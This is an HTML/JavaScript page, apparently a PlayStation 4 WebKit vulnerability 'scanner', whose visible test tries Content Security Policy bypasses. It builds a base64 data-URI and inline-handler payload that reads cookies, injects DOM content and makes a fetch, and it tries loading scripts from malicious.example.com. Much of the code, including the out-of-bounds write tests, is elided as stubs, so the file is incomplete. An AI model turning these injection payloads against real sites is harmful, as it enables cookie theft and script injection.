<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</title>
    <style>
        /* Estilos CSS permanecem os mesmos */
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { background: #111; border: 1px solid #333; padding: 15px; height: 600px; overflow-y: auto; white-space: pre-wrap; margin-top: 15px; }
        #browserInfo { margin-bottom: 15px; border: 1px solid #555; padding: 10px; }
        button { background: #f44336; color: white; border: none; padding: 8px 15px; margin: 5px; border-radius: 3px; }
        select { background: #222; color: #0f0; border: 1px solid #333; padding: 5px; margin: 5px; }
        .success { color: #4CAF50; }
        .danger { color: #f44336; }
        .warning { color: #FFC107; }
        .info { color: #2196F3; }
        .section { color: #9C27B0; font-weight: bold; margin: 10px 0; }
        .poc-potential { color: #FF9800; font-weight: bold; }
        .defense-bypass { color: #00BCD4; font-weight: bold; }
        .privilege-escalation { color: #FF4081; font-weight: bold; }
        .impact { color: #E91E63; font-style: italic; }
    </style>
</head>
<body>
    <h1>PS4 WebKit Vulnerability Scanner | Aggressive POC + Direct Impact</h1>

    <div id="browserInfo">
        <strong>User Agent:</strong> <span id="userAgent"></span><br>
        <strong>Platform:</strong> <span id="platform"></span><br>
    </div>

    <div>
        <select id="testSelector">
            <option value="all_aggressive">Run All Aggressive Tests (Direct Impact)</option>
            <option value="oob_write_aggressive">Aggressive ArrayBuffer OOB Write Investigation</option>
            <option value="oob_impact_tests">OOB Impact Demonstration Tests</option>
            <option value="csp_bypass_aggressive">Aggressive CSP Bypass Attempts (Direct Impact)</option>
            </select>
        <button onclick="runSelectedTest()">Run Selected Test (Aggressive)</button>
        <button onclick="clearLog()">Clear Log</button>
    </div>

    <div id="log"></div>

<script>
// ======================
// Coleta de Informa√ß√µes e Logging (sem altera√ß√µes)
// ======================
document.addEventListener('DOMContentLoaded', function() { /* ... c√≥digo ... */ });
function log(message, type = '') { /* ... c√≥digo ... */ }
function clearLog() { /* ... c√≥digo ... */ }

// Flag global APENAS para OOB (CSP n√£o precisa mais dela para impacto)
var potentialVulnsFound = {
    oobWrite: false
};

// ======================
// Fun√ß√µes Auxiliares para Demonstra√ß√£o de Impacto (agora globais)
// ======================
function demonstrateCookieRead() {
    try {
        const cookies = document.cookie || '(no cookies found or readable)';
        log('[IMPACT-CSP] Cookie Read Attempt Result: ' + cookies, 'impact danger');
    } catch(e) {
        log('[IMPACT-CSP] Error reading cookies: ' + e.message, 'danger');
    }
}

function demonstrateDomManipulation() {
    try {
        const divId = 'csp-impact-div-' + Date.now();
        const div = document.createElement('div');
        div.id = divId;
        div.style.position = 'fixed';
        div.style.top = '0'; div.style.left = '0'; div.style.width = '100%';
        div.style.background = 'red'; div.style.color = 'white';
        div.style.textAlign = 'center'; div.style.padding = '10px';
        div.style.zIndex = '9999';
        div.textContent = '!! CSP Bypass Impact: DOM Manipulation Successful !!';
        // Remover qualquer div anterior para n√£o poluir
        const oldDiv = document.getElementById('csp-impact-div-active');
        if(oldDiv) { try{ document.body.removeChild(oldDiv); } catch(e){} }
        div.id = 'csp-impact-div-active'; // Marcar a ativa
        document.body.appendChild(div);
        log('[IMPACT-CSP] DOM Manipulation Executed: Injected red bar.', 'impact danger');
        // setTimeout(() => { try { document.body.removeChild(div); } catch(e){} }, 5000); // Opcional: Remover ap√≥s 5s
    } catch(e) {
        log('[IMPACT-CSP] Error manipulating DOM: ' + e.message, 'danger');
    }
}

function demonstrateNetworkRequest() {
    const targetUrl = 'https://httpbin.org/get?csp_bypass_poc_direct=true'; // Exemplo usando httpbin
    try {
        log('[IMPACT-CSP] Attempting network request (fetch) to ' + targetUrl + '...', 'info');
        fetch(targetUrl)
            .then(response => {
                if (response.ok) {
                    log('[IMPACT-CSP] Network Request Successful: Received response from ' + targetUrl + '. Status: ' + response.status, 'impact danger');
                } else {
                    log('[IMPACT-CSP] Network Request Failed: Received non-OK response from ' + targetUrl + '. Status: ' + response.status, 'warning');
                }
            })
            .catch(error => {
                log('[IMPACT-CSP] Network Request Error: Could not fetch ' + targetUrl + '. Error: ' + error.message, 'warning');
                log('[IMPACT-CSP] Note: Check CSP connect-src, CORS, network issues.', 'info');
            });
    } catch(e) {
        log('[IMPACT-CSP] Error attempting fetch: ' + e.message, 'danger');
    }
}

// ======================
// Aggressive POC Tests (Com Impacto Direto no CSP)
// ======================
const aggressiveTests = {

    // --- Testes OOB (sem altera√ß√µes significativas) ---
    "oob_write_aggressive": async function() { /* ... c√≥digo id√™ntico ao anterior ... */ },
    "test_oob_metadata": async function() { /* ... c√≥digo id√™ntico ao anterior ... */ },
    "test_oob_crash_probe": async function() { /* ... c√≥digo id√™ntico ao anterior ... */ },


    // --- Teste CSP (Modificado para Impacto Direto) ---
     "csp_bypass_aggressive": async function() {
        log("[PRIV-ESC] Aggressive CSP Bypass Attempts (with Direct Impact Demo)...", "info");

        // ---- Preparar Payloads de Impacto ----
        // Payload para Data URI (precisa ser tudo em uma linha, depois Base64)
        const impactPayloadJsString = `
            console.log('Executing CSP Bypass Payload...');
            demonstrateCookieRead();
            demonstrateDomManipulation();
            demonstrateNetworkRequest();
            console.log('CSP Bypass Payload Execution Finished.');
        `.replace(/\n\s*/g, ''); // Remove newlines and leading spaces for cleaner base64

        // Codificar para Base64
        let impactPayloadBase64 = '';
        try {
             impactPayloadBase64 = btoa(impactPayloadJsString);
             log("[CSP-AGG] Generated Base64 payload for impact tests.", "info");
        } catch (e) {
             log("Error generating Base64 payload: " + e.message, "danger");
             return; // Cannot proceed without payload
        }

        // Payload para Inline Handlers (cuidado com aspas)
        // Usar aspas simples externamente se usar duplas internamente ou vice-versa
        // Ou escapar as aspas. Usar template literals pode ajudar.
        const impactPayloadInlineString = `
            console.log('Executing Inline CSP Bypass Payload via event...');
            demonstrateCookieRead();
            demonstrateDomManipulation();
            demonstrateNetworkRequest();
            console.log('Inline CSP Payload Execution Finished.');
        `.replace(/\n\s*/g, '').replace(/"/g, '&quot;'); // Escape double quotes for HTML attribute

        // ---- Fontes a Testar ----
        const scriptSources = [
             // Data URI com impacto embutido
             `data:text/javascript;base64,${impactPayloadBase64}`,
             // Outras fontes (espera-se que falhem, como antes)
            'http://malicious.example.com/script.js',
            'https://malicious.example.com/script.js',
            'blob:null/someBlob',
            'javascript:console.log("javascript: URI executed - CSP Bypass?")', // Modificado para logar no console
            'vbscript:msgbox("vbscript executed - CSP Bypass?")', // Modificado para logar no console
            'ftp://malicious.example.com/script.js',
            '//malicious.example.com/script.js',
        ];

        // ---- Teste com <script src="..."> ----
        for (const src of scriptSources) {
            log(`[CSP-AGG] Attempting script injection with src: ${src.substring(0,100)}${src.length > 100 ? '...' : ''}`, "info"); // Shorten long data URIs in log
            await new Promise(resolve => {
                 const script = document.createElement('script');
                 const cleanup = () => { /* ... (mesmo c√≥digo de cleanup) ... */ }; // Fun√ß√£o de limpeza id√™ntica
                 script.onerror = () => { /* ... (mesmo c√≥digo onerror) ... */ }; // onerror id√™ntico

                 script.onload = () => {
                     // Se 'onload' disparar, significa que o script (com impacto embutido, se for o data URI) executou
                     log(`<span class="poc-potential defense-bypass privilege-escalation impact">üö© CSP Bypass Possible & Impact Executed: Script loaded from ${src.substring(0,30)}...</span>`, "danger impact");
                     cleanup();
                 };

                 try { /* ... (mesmo c√≥digo try/catch para set src/append) ... */ } // try/catch id√™ntico
                 catch(e) { /* ... (mesmo c√≥digo catch) ... */ } // catch id√™ntico
            });
             await new Promise(resolve => setTimeout(resolve, 100));
        }

        // ---- Teste com script inline em atributos de evento ----
        log("[CSP-AGG] Attempting inline script injection via event attributes (with Direct Impact Demo)...", "info");
        const eventAttributes = ['onerror', 'onload']; // Focar nos mais prov√°veis de disparar programaticamente

        for (const attr of eventAttributes) {
            log(`[CSP-AGG] Setting up inline test for ${attr}...`, "info");
            await new Promise(async resolve => {
                const testElement = document.createElement('img'); // Usar img para onload/onerror
                let bypassDetected = false; // Flag local para este teste espec√≠fico

                // Definir uma fun√ß√£o wrapper que ser√° chamada pelo c√≥digo inline
                // para logar o sucesso ANTES de chamar as fun√ß√µes de impacto
                const uniqueWrapperName = `cspInlineWrapper_${attr}_${Date.now()}`;
                window[uniqueWrapperName] = () => {
                     if (!bypassDetected) { // Logar apenas uma vez por tentativa
                         log(`<span class="poc-potential defense-bypass privilege-escalation impact">üö© CSP Bypass Possible & Impact Executed: Inline script via ${attr} triggered!</span>`, "danger impact");
                         bypassDetected = true;
                     }
                     // Executar o c√≥digo de impacto real
                     eval(impactPayloadInlineString.replace(/&quot;/g, '"')); // Reverter escaping para eval
                     console.log(`Inline payload executed via ${attr}`);
                };

                // O c√≥digo no atributo agora apenas chama o wrapper global
                const inlineCode = `window['${uniqueWrapperName}']();`;
                testElement.setAttribute(attr, inlineCode);

                // Disparar eventos (como antes)
                if (attr === 'onerror') {
                     testElement.src = 'invalid-image-source-' + Math.random();
                } else if (attr === 'onload') {
                     testElement.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
                }

                document.body.appendChild(testElement);
                await new Promise(resolve => setTimeout(resolve, 500)); // Esperar para ver se disparou

                if (!bypassDetected) {
                   log(`[CSP-AGG] Inline script via ${attr} likely blocked or event not triggered.`, "info");
                }

                // Limpeza
                try { document.body.removeChild(testElement); } catch(e){}
                delete window[uniqueWrapperName];
                resolve();
            });
             await new Promise(resolve => setTimeout(resolve, 100)); // Delay entre atributos
        }

        log("[CSP-AGG] Completed aggressive CSP bypass testing (Direct Impact).", "info");
    },

    // --- Executor Principal (Atualizado) ---
    "all_aggressive": async function() {
        log("=== Running All Aggressive Tests (Direct Impact Version) ===", "section");

        await aggressiveTests["oob_write_aggressive"]();
        log("Pausing for 5 seconds after OOB write tests before OOB impact tests...", "info");
        await new Promise(resolve => setTimeout(resolve, 5000));

        if (potentialVulnsFound.oobWrite) { // Flag OOB ainda √© √∫til aqui
             await aggressiveTests["test_oob_metadata"]();
             await new Promise(resolve => setTimeout(resolve, 1000));
             await aggressiveTests["test_oob_crash_probe"]();
              log("Pausing for 5 seconds after OOB impact tests before CSP tests...", "info");
             await new Promise(resolve => setTimeout(resolve, 5000));
        } else {
             log("Skipping OOB impact tests as initial OOB write seemed unsuccessful.", "warning");
        }

        // Agora o teste CSP j√° inclui o impacto
        await aggressiveTests["csp_bypass_aggressive"]();

        log("\n=== All Aggressive Tests (Direct Impact Version) Completed. Review logs and browser behavior thoroughly. ===", "section");
    },

     // Mant√©m a op√ß√£o de rodar s√≥ OOB Impact
     "oob_impact_tests": async function() { /* ... c√≥digo id√™ntico ao anterior ... */ }
     // Remove a op√ß√£o de rodar s√≥ CSP Impact, pois agora est√° embutido

};

// ======================
// Test Runner (Atualizado)
// ======================
async function runSelectedTest() {
    const testSelector = document.getElementById('testSelector');
    const selectedTest = testSelector.value;

    // Remover a op√ß√£o de CSP Impact que n√£o existe mais
     if (selectedTest === "csp_impact_demonstration") {
          log("Error: Separate CSP Impact test removed. Impact is now part of 'Aggressive CSP Bypass Attempts'.", "danger");
          return;
     }

    clearLog();
    log("=== Starting Selected Tests ===", "section");

    if (aggressiveTests[selectedTest]) {
        await aggressiveTests[selectedTest]();
        log(`\n=== Test Execution for "${selectedTest}" Completed. Review logs and browser behavior closely. ===`, "section");
    } else {
        log(`Error: Test "${selectedTest}" not found.`, "danger");
    }
}
</script>
</body>
</html>
